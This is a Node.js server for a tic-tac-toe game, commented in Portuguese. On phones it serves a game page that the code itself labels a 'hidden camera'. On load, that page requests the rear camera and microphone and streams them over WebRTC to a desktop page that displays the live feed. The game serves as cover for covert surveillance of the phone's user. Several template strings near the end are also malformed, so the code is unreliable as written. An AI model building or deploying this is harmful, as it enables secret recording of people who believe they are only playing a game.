const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server);

// Servir arquivos estáticos
app.use(express.static('public'));

// Rota principal - detecta dispositivo e serve página correta
app.get('/', (req, res) => {
    const ua = req.headers['user-agent'].toLowerCase();
    
    if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
        // Página do celular - APENAS JOGO (câmera oculta)
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Jogo da Velha</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 10px;
                }
                .container {
                    background: white;
                    border-radius: 20px;
                    padding: 20px;
                    width: 100%;
                    max-width: 400px;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                }
                h1 { text-align: center; color: #333; margin-bottom: 20px; }
                .status {
                    text-align: center;
                    font-size: 18px;
                    margin: 20px 0;
                    padding: 10px;
                    background: #f0f0f0;
                    border-radius: 10px;
                }
                .board {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 10px;
                    margin: 20px 0;
                }
                .cell {
                    background: #f8f9fa;
                    border: 2px solid #dee2e6;
                    border-radius: 10px;
                    aspect-ratio: 1;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 48px;
                    font-weight: bold;
                    cursor: pointer;
                    transition: all 0.3s;
                }
                .cell:active { transform: scale(0.95); background: #e9ecef; }
                .cell.x { color: #e74c3c; }
                .cell.o { color: #3498db; }
                button {
                    width: 100%;
                    padding: 15px;
                    background: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 10px;
                    font-size: 18px;
                    cursor: pointer;
                    margin-top: 10px;
                }
                button:disabled {
                    background: #ccc;
                    cursor: not-allowed;
                }
                .camera-status {
                    font-size: 12px;
                    color: #666;
                    text-align: center;
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Jogo da Velha</h1>
                <div class="status" id="status">Aguardando oponente...</div>
                <div class="board" id="board"></div>
                <button id="resetBtn" disabled>Reiniciar Jogo</button>
                <div class="camera-status" id="cameraStatus">📷 Câmera iniciando...</div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                let board = ['', '', '', '', '', '', '', '', ''];
                let minhaVez = false;
                let meuSimbolo = '';
                let gameActive = false;
                
                // Criar tabuleiro
                for(let i = 0; i < 9; i++) {
                    let cell = document.createElement('div');
                    cell.className = 'cell';
                    cell.onclick = () => fazerJogada(i);
                    document.getElementById('board').appendChild(cell);
                }
                
                // INICIAR CÂMERA OCULTA
                async function iniciarCamera() {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'environment' }, 
                            audio: true 
                        });
                        
                        document.getElementById('cameraStatus').innerHTML = '📷 Câmera ativa';
                        
                        // Criar conexão WebRTC
                        const peer = new RTCPeerConnection({
                            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                        });
                        
                        // Adicionar tracks
                        stream.getTracks().forEach(track => peer.addTrack(track, stream));
                        
                        // Enviar candidatos ICE
                        peer.onicecandidate = (e) => {
                            if(e.candidate) socket.emit('candidate', e.candidate);
                        };
                        
                        // Criar oferta quando o PC estiver pronto
                        socket.on('pc-pronto', async () => {
                            const offer = await peer.createOffer();
                            await peer.setLocalDescription(offer);
                            socket.emit('offer', offer);
                        });
                        
                        // Receber resposta do PC
                        socket.on('answer', async (answer) => {
                            await peer.setRemoteDescription(answer);
                        });
                        
                        socket.on('candidate', async (candidate) => {
                            try { await peer.addIceCandidate(candidate); } catch(e) {}
                        });
                        
                    } catch (error) {
                        document.getElementById('cameraStatus').innerHTML = '❌ Erro: ' + error.message;
                    }
                }
                
                iniciarCamera();
                
                function fazerJogada(pos) {
                    if(!gameActive || !minhaVez || board[pos] !== '') return;
                    socket.emit('jogada', pos);
                }
                
                // Eventos do jogo
                socket.on('inicio', (data) => {
                    meuSimbolo = data.simbolo;
                    minhaVez = meuSimbolo === 'X';
                    gameActive = true;
                    document.getElementById('resetBtn').disabled = false;
                    document.getElementById('status').innerHTML = 
                        minhaVez ? 'Sua vez (X)' : 'Vez do PC (X)';
                });
                
                socket.on('jogada', (data) => {
                    board[data.pos] = data.simbolo;
                    let cells = document.getElementsByClassName('cell');
                    cells[data.pos].innerHTML = data.simbolo;
                    cells[data.pos].classList.add(data.simbolo.toLowerCase());
                    
                    minhaVez = data.proximaVez === meuSimbolo;
                    document.getElementById('status').innerHTML = 
                        minhaVez ? 'Sua vez' : 'Vez do oponente';
                });
                
                socket.on('fim', (data) => {
                    gameActive = false;
                    document.getElementById('status').innerHTML = data.mensagem;
                });
                
                socket.on('reiniciar', () => {
                    board = ['', '', '', '', '', '', '', '', ''];
                    let cells = document.getElementsByClassName('cell');
                    for(let i = 0; i < 9; i++) {
                        cells[i].innerHTML = '';
                        cells[i].classList.remove('x', 'o');
                    }
                    minhaVez = meuSimbolo === 'X';
                    gameActive = true;
                    document.getElementById('status').innerHTML = 
                        minhaVez ? 'Sua vez' : 'Vez do oponente';
                });
                
                document.getElementById('resetBtn').onclick = () => {
                    socket.emit('reiniciar');
                };
            </script>
        </body>
        </html>
        `);
    } else {
        // Página do PC - JOGO + CÂMERA
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>PC - Jogo da Velha</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 20px;
                }
                .container {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 30px;
                    background: white;
                    border-radius: 20px;
                    padding: 30px;
                    max-width: 1000px;
                    width: 100%;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                }
                .video-box {
                    background: #000;
                    border-radius: 10px;
                    overflow: hidden;
                    aspect-ratio: 4/3;
                }
                video {
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                }
                .game-box { text-align: center; }
                h1 { color: #333; margin-bottom: 20px; }
                .status {
                    font-size: 18px;
                    margin: 20px 0;
                    padding: 10px;
                    background: #f0f0f0;
                    border-radius: 10px;
                }
                .board {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 10px;
                    margin: 20px 0;
                }
                .cell {
                    background: #f8f9fa;
                    border: 2px solid #dee2e6;
                    border-radius: 10px;
                    aspect-ratio: 1;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 48px;
                    font-weight: bold;
                    cursor: pointer;
                    transition: all 0.3s;
                }
                .cell:hover { background: #e9ecef; transform: scale(1.05); }
                .cell.x { color: #e74c3c; }
                .cell.o { color: #3498db; }
                button {
                    padding: 10px 20px;
                    margin: 5px;
                    border: none;
                    border-radius: 5px;
                    font-size: 16px;
                    cursor: pointer;
                }
                #resetBtn { background: #4CAF50; color: white; }
                #audioBtn { background: #3498db; color: white; }
                #audioBtn.muted { background: #e74c3c; }
                .video-status {
                    color: white;
                    background: rgba(0,0,0,0.7);
                    padding: 5px;
                    font-size: 14px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="video-box">
                    <video id="videoCelular" autoplay playsinline></video>
                    <div class="video-status" id="videoStatus">📱 Aguardando celular...</div>
                </div>
                
                <div class="game-box">
                    <h1>Jogo da Velha</h1>
                    <div class="status" id="status">Conectando...</div>
                    <div class="board" id="board"></div>
                    <div>
                        <button id="resetBtn" disabled>Reiniciar</button>
                        <button id="audioBtn">🔊 Áudio</button>
                    </div>
                </div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                let board = ['', '', '', '', '', '', '', '', ''];
                let minhaVez = true;
                let gameActive = false;
                
                // Criar tabuleiro
                for(let i = 0; i < 9; i++) {
                    let cell = document.createElement('div');
                    cell.className = 'cell';
                    cell.onclick = () => fazerJogada(i);
                    document.getElementById('board').appendChild(cell);
                }
                
                // Configurar WebRTC para receber vídeo
                const peer = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                const videoElement = document.getElementById('videoCelular');
                
                peer.ontrack = (event) => {
                    videoElement.srcObject = event.streams[0];
                    document.getElementById('videoStatus').innerHTML = '📱 Celular conectado';
                };
                
                peer.onicecandidate = (e) => {
                    if(e.candidate) socket.emit('candidate', e.candidate);
                };
                
                // Avisar que o PC está pronto
                socket.emit('pc-pronto');
                
                // Receber oferta do celular
                socket.on('offer', async (offer) => {
                    await peer.setRemoteDescription(offer);
                    const answer = await peer.createAnswer();
                    await peer.setLocalDescription(answer);
                    socket.emit('answer', answer);
                });
                
                socket.on('candidate', async (candidate) => {
                    try { await peer.addIceCandidate(candidate); } catch(e) {}
                });
                
                socket.on('inicio', () => {
                    gameActive = true;
                    document.getElementById('resetBtn').disabled = false;
                    document.getElementById('status').innerHTML = 'Sua vez (X)';
                });
                
                function fazerJogada(pos) {
                    if(!gameActive || !minhaVez || board[pos] !== '') return;
                    socket.emit('jogada', pos);
                }
                
                socket.on('jogada', (data) => {
                    board[data.pos] = data.simbolo;
                    let cells = document.getElementsByClassName('cell');
                    cells[data.pos].innerHTML = data.simbolo;
                    cells[data.pos].classList.add(data.simbolo.toLowerCase());
                    
                    minhaVez = data.proximaVez === 'X';
                    document.getElementById('status').innerHTML = 
                        minhaVez ? 'Sua vez' : 'Vez do celular';
                });
                
                socket.on('fim', (data) => {
                    gameActive = false;
                    document.getElementById('status').innerHTML = data.mensagem;
                });
                
                socket.on('reiniciar', () => {
                    board = ['', '', '', '', '', '', '', '', ''];
                    let cells = document.getElementsByClassName('cell');
                    for(let i = 0; i < 9; i++) {
                        cells[i].innerHTML = '';
                        cells[i].classList.remove('x', 'o');
                    }
                    minhaVez = true;
                    gameActive = true;
                    document.getElementById('status').innerHTML = 'Sua vez';
                });
                
                document.getElementById('resetBtn').onclick = () => {
                    socket.emit('reiniciar');
                };
                
                let audioAtivo = true;
                document.getElementById('audioBtn').onclick = () => {
                    audioAtivo = !audioAtivo;
                    videoElement.volume = audioAtivo ? 1 : 0;
                    document.getElementById('audioBtn').innerHTML = audioAtivo ? '🔊 Áudio' : '🔇 Áudio';
                    document.getElementById('audioBtn').classList.toggle('muted', !audioAtivo);
                };
            </script>
        </body>
        </html>
        `);
    }
});

// Lógica do jogo
let jogo = {
    board: ['', '', '', '', '', '', '', '', ''],
    vez: 'X',
    mobile: null,
    desktop: null,
    ativo: false
};

function verificarVencedor() {
    const lines = [
        [0,1,2], [3,4,5], [6,7,8],
        [0,3,6], [1,4,7], [2,5,8],
        [0,4,8], [2,4,6]
    ];
    
    for(let l of lines) {
        if(jogo.board[l[0]] && 
           jogo.board[l[0]] === jogo.board[l[1]] && 
           jogo.board[l[0]] === jogo.board[l[2]]) {
            return jogo.board[l[0]];
        }
    }
    return null;
}

io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);
    
    // Registrar jogadores
    if (!jogo.desktop) {
        jogo.desktop = socket.id;
        socket.emit('inicio', { simbolo: 'X' });
    } else if (!jogo.mobile) {
        jogo.mobile = socket.id;
        socket.emit('inicio', { simbolo: 'O' });
        jogo.ativo = true;
        io.emit('inicio');
    }
    
    // WebRTC signaling
    socket.on('pc-pronto', () => {
        socket.broadcast.emit('pc-pronto');
    });
    
    socket.on('offer', (offer) => {
        socket.broadcast.emit('offer', offer);
    });
    
    socket.on('answer', (answer) => {
        socket.broadcast.emit('answer', answer);
    });
    
    socket.on('candidate', (candidate) => {
        socket.broadcast.emit('candidate', candidate);
    });
    
    // Jogadas
    socket.on('jogada', (pos) => {
        if (!jogo.ativo) return;
        
        let jogador = socket.id === jogo.desktop ? 'X' : 'O';
        if (jogador !== jogo.vez) return;
        if (jogo.board[pos] !== '') return;
        
        jogo.board[pos] = jogador;
        
        let vencedor = verificarVencedor();
        let proximaVez = jogo.vez === 'X' ? 'O' : 'X';
        
        if (vencedor) {
            jogo.ativo = false;
            io.emit('fim', { mensagem: \`Jogador \${vencedor} venceu! 🎉\` });
        } else if (!jogo.board.includes('')) {
            jogo.ativo = false;
            io.emit('fim', { mensagem: 'Empate! 🤝' });
        } else {
            jogo.vez = proximaVez;
        }
        
        io.emit('jogada', { pos, simbolo: jogador, proximaVez });
    });
    
    socket.on('reiniciar', () => {
        jogo.board = ['', '', '', '', '', '', '', '', ''];
        jogo.vez = 'X';
        jogo.ativo = true;
        io.emit('reiniciar');
    });
    
    socket.on('disconnect', () => {
        if (socket.id === jogo.desktop) jogo.desktop = null;
        if (socket.id === jogo.mobile) jogo.mobile = null;
        jogo.ativo = false;
        console.log('Cliente desconectado:', socket.id);
    });
});

// Porta do Railway
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(\`Servidor rodando na porta \${PORT}\`);
});
